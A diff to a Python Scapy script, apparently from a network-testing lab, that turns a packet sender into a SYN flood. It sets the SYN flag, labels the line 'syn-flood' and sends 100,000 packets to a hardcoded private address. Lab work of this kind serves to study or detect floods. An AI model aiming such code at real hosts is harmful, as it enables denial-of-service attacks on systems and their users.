@@ -23,11 +23,11 @@ def get_if():
 
 def main():
 
-    if len(sys.argv)<2:
+    if len(sys.argv)<1:
         print('pass 1 argument: <destination>')
         exit(1)
 
-    addr = socket.gethostbyname(sys.argv[1])
+    addr = socket.gethostbyname("10.0.1.1")
     iface = get_if()
 
     print(("sending on interface %s to %s" % (iface, str(addr))))
@@ -35,8 +35,8 @@ def main():
     #pkt = pkt / IP(dst=addr) / UDP(dport=53) / DNS(id = 111,qr = 0,opcode = 0,rd = 1) 
     #pkt = pkt / IP(dst=addr) / UDP(sport=53)
     #pkt = pkt / IP(dst=addr) / UDP(sport=random.randint(49152,65535),dport=53) / DNS(id = 111,qr = 0,opcode = 0,rd = 1)
-    pkt = pkt /IP(dst=addr) / TCP(dport=1234, sport=random.randint(49152,65535)) / "attack"
-    for pac in range(1000):
+    pkt = pkt /IP(dst=addr) / TCP(dport=1234, sport=random.randint(49152,65535) , flags=2 ) / "attack" #syn-flood
+    for pac in range(100000):
         sendp(pkt, iface=iface, verbose=False)
     #pkt.show2()
     #sendp(pkt, iface=iface, verbose=False)
